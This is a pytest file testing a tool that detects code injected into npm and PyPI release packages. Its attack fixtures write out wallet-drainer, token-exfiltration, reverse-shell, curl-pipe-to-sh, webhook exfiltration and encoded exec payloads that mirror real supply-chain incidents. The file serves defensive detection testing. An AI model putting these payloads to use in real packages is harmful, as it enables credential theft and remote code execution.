"""Evaluation corpus for PRD FR-3 .. FR-8 and section 8.

Each attack mirrors a real incident and must be SUSPICIOUS. Each benign case mirrors normal build or
packaging output and must never be SUSPICIOUS (most must be CLEAN). Everything is local: no network.
"""

from __future__ import annotations

import json

import pytest

from whotouchedmytarball.analyzer import AnalyzeOptions, analyze_local
from whotouchedmytarball.models import Category, DiffKind, Report, Severity

from .conftest import INDEX_JS, make_tgz, make_zip, npm_manifest, write_tree

OPTS = AnalyzeOptions(ai=None)


def manifest(**changes) -> str:
    doc = json.loads(npm_manifest())
    for key, value in changes.items():
        if isinstance(value, dict) and isinstance(doc.get(key), dict):
            doc[key] = {**doc[key], **value}
        else:
            doc[key] = value
    return json.dumps(doc, indent=2) + "\n"


def npm_case(tmp_path, npm_source, files: dict) -> Report:
    pkg = make_tgz(tmp_path / "demo.tgz", {"package.json": npm_manifest(), "index.js": INDEX_JS, **files})
    return analyze_local(pkg, str(npm_source), opts=OPTS)


PY_SOURCE = {
    "pyproject.toml": "[project]\nname = 'demo'\nversion = '1.0'\n",
    "setup.py": "from setuptools import setup\nsetup()\n",
    "src/demo/__init__.py": "VALUE = 1\n",
}


def py_case(tmp_path, files: dict, *, wheel: bool = False, base: dict | None = None) -> Report:
    src = write_tree(tmp_path / "pysource", PY_SOURCE)
    if wheel:
        content = {"demo/__init__.py": "VALUE = 1\n", "demo-1.0.dist-info/METADATA": "Name: demo\n", **files}
        pkg = make_zip(tmp_path / "demo-1.0-py3-none-any.whl", content)
    else:
        content = {**PY_SOURCE, "PKG-INFO": "Metadata-Version: 2.1\nName: demo\n", **(base or {}), **files}
        pkg = make_tgz(tmp_path / "demo-1.0.tar.gz", content, prefix="demo-1.0/")
    return analyze_local(pkg, str(src), ecosystem="pypi", opts=OPTS)


# --- attack corpus (FR-5) ------------------------------------------------------------------------

WALLET_DRAINER = (  # debug/chalk, September 2025: obfuscated hook on fetch that swaps wallet addresses
    "var _0x3c1a=['ethereum','request'];(function(_0x2b9e,_0x3c1a5){})();\n"
    "const _0xf00d=window.fetch;window.fetch=async function(...a){const r=await _0xf00d(...a);"
    "return r.text().then(t=>t.replace(/0x[a-fA-F0-9]{40}/g,'0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976'));};\n"
)
SHAI_HULUD = (  # September 2025 worm: steals tokens and publishes them through the GitHub API
    "const t = process.env.GITHUB_TOKEN || process.env.NPM_TOKEN;\n"
    "fetch('https://api.github.com/user/repos', {method: 'POST', headers: {Authorization: 'token ' + t},"
    " body: JSON.stringify({name: 'Shai-Hulud', data: JSON.stringify(process.env)})});\n"
)
EVENT_STREAM = (  # flatmap-stream, 2018: AES-encrypted payload compiled as a module at runtime
    "var r=require,t=process;function e(r){return Buffer.from(r,'hex').toString()}\n"
    "var n=r(e('2e2f746573742f64617461')),o=t[e(n[3])][e(n[4])];if(!o)return;\n"
    "var u=r(e(n[2]))[e(n[6])](e(n[5]),o),a=u.update(n[0],e(n[8]),e(n[9]));a+=u.final(e(n[9]));\n"
    "var f=new module.constructor;f.paths=module.paths;f[e(n[7])](a,'');f.exports(n[1]);\n"
)
EVENT_STREAM_PLAIN = (  # the same loader with the strings in clear text
    "var d = require('crypto').createDecipher('aes256', process.env.npm_package_description);\n"
    "var m = new module.constructor; m.paths = module.paths; m._compile(d.update(payload, 'hex', 'utf8'), '');\n"
)


ATTACKS = {
    "wallet-drainer-in-modified-file": lambda tp, src: npm_case(tp, src, {"index.js": INDEX_JS + WALLET_DRAINER}),
    "shai-hulud-postinstall-worm": lambda tp, src: npm_case(tp, src, {
        "package.json": manifest(scripts={"postinstall": "node bundle.js"}), "bundle.js": SHAI_HULUD}),
    "event-stream-encrypted-loader": lambda tp, src: npm_case(tp, src, {"index.js": INDEX_JS + EVENT_STREAM_PLAIN}),
    "ua-parser-preinstall-miner": lambda tp, src: npm_case(tp, src, {
        "package.json": manifest(scripts={"preinstall": "node preinstall.js"}),
        "preinstall.js": "const { exec } = require('child_process');\n"
                         "exec('curl http://159.148.186.228/download/jsextension -o jsextension && ./jsextension');\n"}),
    "npmrc-to-discord-webhook": lambda tp, src: npm_case(tp, src, {"lib/telemetry.js":
        "const fs = require('fs'), os = require('os');\n"
        "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
        "fetch('https://discord.com/api/webhooks/123/abc', {method: 'POST', body: npmrc});\n"}),
    "reverse-shell-install-script": lambda tp, src: npm_case(tp, src, {
        "package.json": manifest(scripts={"install": "sh install.sh"}),
        "install.sh": "#!/bin/sh\nbash -i >& /dev/tcp/192.0.2.10/4444 0>&1\n"}),
    "new-function-from-base64": lambda tp, src: npm_case(tp, src, {"index.js": INDEX_JS +
        "new Function(atob('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImlkIik='))();\n"}),
    "trojan-source-bidi": lambda tp, src: npm_case(tp, src, {"index.js": INDEX_JS.replace(
        "return a + b;", "return a + b; /*\u202e } \u2066if (isAdmin)\u2069 \u2066 begin admins only */")}),
    "axios-2026-injected-dependency": lambda tp, src: npm_case(tp, src, {
        "package.json": manifest(dependencies={"plain-crypto-js": "^4.2.1"})}),
    "pypi-setup-cmdclass-dropper": lambda tp, src: py_case(tp, {"setup.py":
        "import os\nfrom setuptools import setup\nfrom setuptools.command.install import install\n"
        "class PostInstall(install):\n    def run(self):\n        os.system('curl -s http://192.0.2.1/x | sh')\n"
        "        install.run(self)\nsetup(cmdclass={'install': PostInstall})\n"}),
    "pypi-w4sp-exec-base64": lambda tp, src: py_case(tp, {"src/demo/__init__.py": "VALUE = 1\n"
        "import base64;exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgnaWQnKQ=='))\n"}),
    "pypi-zlib-marshal-loader": lambda tp, src: py_case(tp, {"src/demo/_speedups.py":
        "import marshal, zlib\nexec(marshal.loads(zlib.decompress(b'x\\x9c...')))\n"}),
    "pypi-environment-exfiltration": lambda tp, src: py_case(tp, {"src/demo/__init__.py": "VALUE = 1\n"
        "import os, requests\nrequests.post('https://webhook.site/x', json=dict(os.environ))\n"}),
    "pypi-pth-autorun-in-wheel": lambda tp, src: py_case(tp, {
        "zzz_init.pth": "import os; os.system('curl https://example.invalid/x | sh')\n"}, wheel=True),
    "pypi-hidden-dunder-import": lambda tp, src: py_case(tp, {"src/demo/__init__.py": "VALUE = 1\n"
        "__import__('subprocess').Popen(['sh', '-c', 'id'])\n"}),
    # CVE-2024-3094: build-to-host.m4 existed only in the release tarball (lines from the real file)
    "xz-style-m4-in-sdist": lambda tp, src: py_case(tp, {"m4/build-to-host.m4":
        "gl_am_configmake=`grep -aErls \"#{4}[[:alnum:]]{5}#{4}$\" $srcdir/ 2>/dev/null`\n"
        "gl_[$1]_prefix=`echo $gl_am_configmake | sed \"s/.*\\.//g\"`\n"
        "gl_path_map='tr \"\\t \\-_\" \" \\t_\\-\"'\n"
        "gl_[$1]_config='sed \\\"r\\n\\\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'\n"}),
}


@pytest.mark.parametrize("name", sorted(ATTACKS))
def test_attack_is_suspicious(name, tmp_path, npm_source):
    report = ATTACKS[name](tmp_path, npm_source)
    flagged = [f"{f.path}: {f.severity.value} {f.reason}" for f in report.findings if f.severity.rank >= Severity.HIGH.rank]
    assert report.verdict == "SUSPICIOUS", f"{name}: {report.verdict}, {report.summary}"
    assert flagged, name


def test_obfuscated_event_stream_loader_is_suspicious(tmp_path, npm_source):
    """The real flatmap-stream payload hid every name behind hex strings."""
    report = npm_case(tmp_path, npm_source, {"index.js": INDEX_JS + EVENT_STREAM})
    assert report.verdict == "SUSPICIOUS", report.summary


# --- benign corpus (FR-4, FR-6) ------------------------------------------------------------------

BENIGN = {
    "npm-registry-added-manifest-fields": lambda tp, src: npm_case(tp, src, {"package.json": manifest(
        gitHead="a" * 40, _id="demo@1.0.0", _npmVersion="10.8.2", files=["index.js"])}),
    "readme-and-license-changes": lambda tp, src: npm_case(tp, src, {
        "README.md": "# demo\n\n[![npm](https://img.shields.io/npm/v/demo.svg)](https://npmjs.com/demo)\n",
        "LICENSE": "MIT License\n", "CHANGELOG.md": "## 1.0.0\n- first\n"}),
    "crlf-line-endings": lambda tp, src: npm_case(tp, src, {"index.js": INDEX_JS.replace("\n", "\r\n")}),
    "pypi-wheel-metadata": lambda tp, src: py_case(tp, {
        "demo-1.0.dist-info/RECORD": "demo/__init__.py,sha256=x,10\n",
        "demo-1.0.dist-info/WHEEL": "Wheel-Version: 1.0\nGenerator: setuptools\n",
        "demo-1.0.dist-info/entry_points.txt": "[console_scripts]\ndemo = demo:main\n",
        "demo-1.0.dist-info/top_level.txt": "demo\n"}, wheel=True),
    "pypi-sdist-egg-info": lambda tp, src: py_case(tp, {
        "src/demo.egg-info/PKG-INFO": "Name: demo\n", "src/demo.egg-info/SOURCES.txt": "setup.py\n",
        "src/demo.egg-info/top_level.txt": "demo\n", "setup.cfg": "[egg_info]\ntag_build = \ntag_date = 0\n\n"}),
}


@pytest.mark.parametrize("name", sorted(BENIGN))
def test_benign_release_is_clean(name, tmp_path, npm_source):
    report = BENIGN[name](tmp_path, npm_source)
    assert report.verdict == "CLEAN", f"{name}: {report.verdict}: " + "; ".join(
        f"{f.path} {f.severity.value} {f.reason}" for f in report.findings if f.severity.rank >= Severity.MEDIUM.rank)


def test_benign_typescript_build_with_esm_cjs_maps_and_types(tmp_path):
    src = write_tree(tmp_path / "source", {
        "package.json": manifest(main="dist/index.cjs"),
        "src/index.ts": "export const add = (a: number, b: number): number => a + b;\n",
        "tsconfig.json": "{}\n",
    })
    pkg = make_tgz(tmp_path / "demo.tgz", {
        "package.json": manifest(main="dist/index.cjs"),
        "dist/index.cjs": "'use strict';\nexports.add = (a, b) => a + b;\n//# sourceMappingURL=index.cjs.map\n",
        "dist/index.mjs": "export const add = (a, b) => a + b;\n//# sourceMappingURL=index.mjs.map\n",
        "dist/index.d.ts": "export declare const add: (a: number, b: number) => number;\n",
        "dist/index.cjs.map": '{"version":3,"sources":["../src/index.ts"],"mappings":"AAAA"}\n',
    })
    report = analyze_local(pkg, str(src), opts=OPTS)
    assert report.verdict == "CLEAN", report.summary


def test_benign_install_script_that_exists_in_source(tmp_path):
    """esbuild/sharp-style: the postinstall is in the reviewed repository, so it is not an injection."""
    files = {"package.json": manifest(scripts={"postinstall": "node install.js"}),
             "install.js": "const { execSync } = require('child_process');\nexecSync('node-gyp rebuild');\n",
             "index.js": INDEX_JS}
    src = write_tree(tmp_path / "source", files)
    report = analyze_local(make_tgz(tmp_path / "demo.tgz", files), str(src), opts=OPTS)
    assert report.verdict == "CLEAN", report.summary


def test_version_stamp_is_never_suspicious(tmp_path):
    src = write_tree(tmp_path / "source", {"package.json": npm_manifest(),
                                            "index.js": "exports.VERSION = '0.0.0-development';\n"})
    pkg = make_tgz(tmp_path / "demo.tgz", {"package.json": npm_manifest(), "index.js": "exports.VERSION = '1.0.0';\n"})
    assert analyze_local(pkg, str(src), opts=OPTS).verdict in ("CLEAN", "REVIEW")


# --- explanations and evidence (FR-7, FR-8) ----------------------------------------------------

def test_finding_explains_every_difference(tmp_path, npm_source):
    report = ATTACKS["shai-hulud-postinstall-worm"](tmp_path, npm_source)
    for f in report.findings:  # identical files never become findings
        assert f.reason and f.category and f.severity
    worm = next(f for f in report.findings if f.path == "bundle.js")
    assert worm.kind == DiffKind.PACKAGE_ONLY
    assert all(s.line for s in worm.signals if s.rule not in ("high-entropy", "decode-and-execute"))
    assert "GITHUB_TOKEN" in worm.diff_excerpt


def test_finding_report_is_json_serialisable_and_scored(tmp_path, npm_source):
    report = ATTACKS["wallet-drainer-in-modified-file"](tmp_path, npm_source)
    data = json.loads(report.model_dump_json())
    assert data["verdict"] == "SUSPICIOUS" and 0 <= data["risk_score"] <= 100
    (tmp_path / "clean").mkdir()
    assert npm_case(tmp_path / "clean", npm_source, {}).risk_score < data["risk_score"]


def test_finding_without_source_is_never_clean(tmp_path):
    pkg = make_tgz(tmp_path / "demo.tgz", {"package.json": npm_manifest(), "index.js": INDEX_JS})
    assert analyze_local(pkg, None, opts=OPTS).verdict == "UNVERIFIED"


def test_finding_package_only_code_is_scanned_but_docs_are_not(tmp_path, npm_source):
    report = npm_case(tmp_path, npm_source, {"docs/guide.md": "Run `curl http://192.0.2.1 | sh` to install.\n"})
    doc = next(f for f in report.findings if f.path == "docs/guide.md")
    assert doc.category == Category.DOCUMENTATION and report.verdict == "CLEAN"
